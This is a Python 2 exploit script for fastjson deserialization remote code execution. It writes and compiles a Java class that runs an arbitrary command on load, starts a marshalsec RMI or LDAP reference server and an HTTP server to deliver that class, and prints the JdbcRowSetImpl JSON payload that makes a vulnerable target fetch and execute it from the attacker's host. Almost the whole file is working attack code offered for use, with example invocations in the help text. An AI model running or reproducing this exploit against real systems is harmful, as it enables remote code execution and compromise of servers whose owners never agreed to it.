#coding:utf-8
import sys, getopt
import thread
import time
import os
#目录下放置marshalsec-0.0.3-SNAPSHOT-all.jar

def fastjsonexp(command,httpip,httpport,jndiport,action):

    initjavafile(command)
    os.system("javac Jndi.java")
    jndiserver_commond=""
    if(action=="rmi"):
        jndiserver_commond="java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://%s:%s/#Jndi\" %s" %(httpip,httpport,jndiport)
        message="EXP \n{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%s:%s/Jndi\",\"autoCommit\":true}}\n" %(httpip,jndiport)
        print message
    elif(action=="ldap"):
        jndiserver_commond="java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://%s:%s/#Jndi\" %s  " %(httpip,httpport,jndiport)
        message = "EXP \n{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://%s:%s/Jndi\",\"autoCommit\":true}}\n" % (httpip, jndiport)
        print message
    else:
        print "-t error"
        sys.exit()
    httpserver_commond=("python -m SimpleHTTPServer %s" %httpport)

    osexec(jndiserver_commond, httpserver_commond)
    print

def initjavafile(command):
    str1="""import java.lang.Runtime;
import java.lang.Process;

public class Jndi {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
           // String[] commands = {"cacl"};
	String[] commands = {"""
    str2="""};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
"""
    arr=command.split()
    strmid=""
    for i in arr:
        s=("\"%s\"," %(i))
        strmid=strmid+s
    #print str1+strmid[0:-1]+str2
    write("Jndi.java",str1+strmid[0:-1]+str2)
    return str1+strmid[0:-1]+str2

def write(name,str):
    f=open(name,"w")
    f.write(str)
    f.close()

def osexecaction(commond):
    print commond
    os.system(commond)
def osexec(command1,command2):
    try:
        thread.start_new_thread(osexecaction, ( command1,))
        time.sleep(0.5)
        thread.start_new_thread(osexecaction, (command2,))
    except:
        print "Error: unable to start thread"
    while 1:
        pass


#fastjsonexp("touch su11","30.1.20.17","8888","9999","rmi")


def main(argv):
    command = ''
    ip = ''
    httpport=''
    jnditype=''
    jndiport=''
    try:
        opts, args = getopt.getopt(argv,"hc:i:p:s:t:",["help","command=","ip=","httpport=","jndiport=","jnditype="])
    except getopt.GetoptError:
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-h","--help"):
            print 'test.py -c <comand> -i <hostip> -t <rmi/ldap> --httpport <httpport> --jndiport <jndiport>\npython fastjsonexp.py -c \"whoami\" -i 30.1.20.3 -t rmi  --httpport 8888  --jndiport 9999\npython fastjsonexp.py -c \"touch /tmp/succ\" -i 30.1.20.3 -t ldap  --httpport 8888  --jndiport 9999'
            sys.exit()
        elif opt in ("-c", "--command"):
            command = arg
        elif opt in ("-i", "--ip"):
            ip = arg
        elif opt in ("-p", "--httpport"):
            httpport = arg
        elif opt in ("-s", "--jndiport"):
            jndiport = arg
        elif opt in ("-t", "--jnditype"):
            jnditype = arg
    print command
    fastjsonexp(command, ip, httpport, jndiport, jnditype)
if __name__ == "__main__":
    main(sys.argv[1:])
